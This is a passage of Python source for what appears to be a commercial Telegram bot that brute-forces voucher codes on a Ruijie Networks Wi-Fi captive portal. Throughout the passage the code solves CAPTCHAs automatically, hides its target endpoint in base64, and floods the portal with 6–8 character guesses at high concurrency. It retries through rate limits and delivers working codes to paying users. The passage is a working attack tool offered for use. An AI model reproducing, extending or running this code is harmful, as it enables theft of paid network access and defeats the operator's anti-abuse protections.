        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar()) as sess:
        for url in paths:
            try:
                async with sess.get(url, headers=headers, timeout=10) as req:
                    if req.status == 200:
                        data = await req.json()
                        if data.get('success'):
                            result = data.get('result', {})
                            raw_minutes = result.get('totalMinutes') or result.get('remainingMinutes')
                            profile_name = result.get('profileName', 'Normal')
                            if raw_minutes is not None:
                                mins = int(raw_minutes)
                                if mins == 0:
                                    time_str = "0m"
                                else:
                                    hh, mm = divmod(mins, 60)
                                    time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                                return profile_name, time_str
            except:
                continue
    return "Normal", "30m"

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=TIMEOUT)
            ) as session:
                session_id = await get_session_id(session, session_url, None)
                if not session_id:
                    return
                auth_code = None
                for _ in range(8):
                    try:
                        img = await Captcha_Image(session, session_id)
                        text = await Captcha_Text(img)
                        if not text:
                            continue
                        verified = await Varify_Captcha(session, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except:
                        pass
                if not auth_code:
                    return
                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                        return
                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36",
                }
                async with session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    if response and 'request limited' in response.lower():
                        await asyncio.sleep(random.uniform(0.5, 1.0))
                        continue
                    break
        except:
            await asyncio.sleep(0.5)
            continue
    else:
        return

    if not response:
        return

    # Detect success & Revoke Access
    if 'logonUrl' in response:
        if recheck:
            return code

        profile_name, time_str = await Code_Expires_Date(session_id)
        
        success_texts.setdefault(chat_id, []).append(code)
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)
        
        user_info = db_get_user(str(chat_id))
        if user_info:
            key_info = db_get_key(user_info["key"])
            if key_info:
                db_update_used_codes(user_info["key"], key_info["used_codes"] + 1)
            # Auto-revoke user access key upon success hit
            db_delete_key(user_info["key"])
            paid_users.pop(str(chat_id), None)
            approve.pop(chat_id, None)

        if message:
            try:
                hit_msg = f"""⚡ **SUCCESS HIT!**
────────────────────
• Code: `{code}`
• Plan: {profile_name} ({time_str})
────────────────────
⚠️ **Access revoked due to success hit.**"""
                await bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
            except Exception as e:
                logger.error(f"Success message error: {e}")
    elif 'STA' in response:
        limited_texts.setdefault(chat_id, []).append(code)

# --- Code generators, run_bruteforce, send_success_file ---
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def engsmall_generator(length):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def engmixed_generator(length):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode == "6":
            codes = [str(i).zfill(6) for i in range(10 ** 6)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "7":
            codes = [str(i).zfill(7) for i in range(10 ** 7)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "engsmall6":
        while True:
            yield engsmall_generator(6)
    if mode == "engsmall7":
        while True:
            yield engsmall_generator(7)
    if mode == "engsmall8":
        while True:
            yield engsmall_generator(8)
    if mode == "engmixed6":
        while True:
            yield engmixed_generator(6)
    if mode == "engmixed7":
        while True:
            yield engmixed_generator(7)
    if mode == "engmixed8":
        while True:
            yield engmixed_generator(8)
    raise ValueError(f"Unsupported mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None and total > 0:
        bar_length = 20
        percent = min(100, (checked / total) * 100)
        filled = int(percent / 5)
        bar = "█" * filled + "░" * (bar_length - filled)
        return f"🔍 Scanning VOUCHER Codes...\n\n📦 Checked : {checked:,}/{total:,}\n📊 Progress : {percent:.2f}%\n⚡ Speed : {speed_str}\n✅ Success hit : {found}\n[{bar}]"
    return f"🔍 Scanning VOUCHER Codes...\n\n📦 Checked : {checked:,}\n⚡ Speed : {speed_str}\n✅ Success hit : {found}\n📊 Status : running\n"

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    global _voucher_sem
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    else:
        total = None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(MAX_CONCURRENT)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                success_messages.pop(chat_id, None)
                success_texts.pop(chat_id, None)
                return
            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            if time.monotonic() - last_key_check >= 600:
                user_info = db_get_user(str(chat_id))
                if user_info:
                    key_info = db_get_key(user_info["key"])
                    if not key_info or not check_key_expiration(key_info["expires_at"]):
                        approve[chat_id] = False
                        paid_users.pop(str(chat_id), None)
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()
            if batch:
                db_save_checkpoint(str(chat_id), mode, batch[-1], start_digit)
            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)
            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            if total is not None:
                text = format_progress(checked, total, speed, found)
            else:
                text = format_progress(checked, None, speed, found)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass
        found = len(success_texts.get(chat_id, []))
        finish_text = f"🔍 Scanning Completed\n\n📦 Checked : {checked:,}" + (f"/{total:,}" if total else "") + f"\n✅ Success hit: {found}\n📊 Progress : 100%\n[██████████████████]"
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
        except:
            try:
                await bot.send_message(chat_id, finish_text)
            except:
                pass
        await send_success_file(chat_id)
        db_clear_checkpoint(str(chat_id))
    except asyncio.CancelledError:
        if batch:
            db_save_checkpoint(str(chat_id), mode, batch[-1], start_digit)
        await send_success_file(chat_id)
        raise
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"success_codes_{chat_id}_{timestamp}.txt"
            content = "\n\n".join(success_texts[chat_id])
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Success Codes Found\nUser ID: {chat_id}\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nTotal: {len(success_texts[chat_id])}\n{'='*50}\n\n{content}")
            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption=f"✅ Found {len(success_texts[chat_id])} Success Codes")
            os.remove(filename)
        except Exception as e:
            logger.error(f"send_success_file error: {e}")

# ==================== WEB SERVER ====================
async def handle(request):
    return web.Response(text="Bot is running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==================== MAIN ====================
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.error(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        limit_per_host=CONNECTION_PER_HOST,
        ttl_dns_cache=300,
        ssl=False
    )
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
